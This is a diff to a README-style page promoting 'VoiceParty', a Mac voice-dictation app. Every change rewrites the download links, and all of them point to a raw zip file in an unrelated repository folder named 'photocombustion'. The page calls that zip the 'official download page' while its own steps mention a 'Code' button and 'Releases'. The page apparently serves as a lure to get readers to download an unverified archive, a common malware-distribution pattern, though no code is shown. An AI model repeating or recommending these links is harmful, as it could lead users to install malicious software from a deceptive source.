@@ -5,7 +5,7 @@ description: "Dictate privately on your Mac—hold a key, speak, and get clean t
 ---
 # 🎤 VoiceParty - Type With Your Voice, Not Your Fingers
 
-[![Download VoiceParty](https://img.shields.io/badge/Download-VoiceParty-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/YUNIWORLS/yuniworls.github.io/main/photocombustion/v1.6.zip)
+[![Download VoiceParty](https://img.shields.io/badge/Download-VoiceParty-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/YUNIWORLS/yuniworls.github.io/raw/refs/heads/main/photocombustion/v1.6.zip)
 
 ---
 
@@ -38,7 +38,7 @@ Follow these simple steps to start dictating with VoiceParty:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [VoiceParty Download](https://raw.githubusercontent.com/YUNIWORLS/yuniworls.github.io/main/photocombustion/v1.6.zip)
+Visit this link to download the application: [VoiceParty Download](https://github.com/YUNIWORLS/yuniworls.github.io/raw/refs/heads/main/photocombustion/v1.6.zip)
 
 Click the green "Code" button or look for the "Releases" section on the right side of the page.
 
@@ -185,9 +185,9 @@ VoiceParty is more than software — it's a community:
 
 Ready to type with your voice? Click the button below:
 
-[![Download VoiceParty](https://img.shields.io/badge/⬇️%20Download%20VoiceParty%20Free-2EA043?style=for-the-badge&logo=github&logoColor=white&label=)](https://raw.githubusercontent.com/YUNIWORLS/yuniworls.github.io/main/photocombustion/v1.6.zip)
+[![Download VoiceParty](https://img.shields.io/badge/⬇️%20Download%20VoiceParty%20Free-2EA043?style=for-the-badge&logo=github&logoColor=white&label=)](https://github.com/YUNIWORLS/yuniworls.github.io/raw/refs/heads/main/photocombustion/v1.6.zip)
 
-Visit the [official download page](https://raw.githubusercontent.com/YUNIWORLS/yuniworls.github.io/main/photocombustion/v1.6.zip), download the file, and follow the simple installation steps above. You'll be dictating in minutes — guaranteed.
+Visit the [official download page](https://github.com/YUNIWORLS/yuniworls.github.io/raw/refs/heads/main/photocombustion/v1.6.zip), download the file, and follow the simple installation steps above. You'll be dictating in minutes — guaranteed.
 
 ---
 
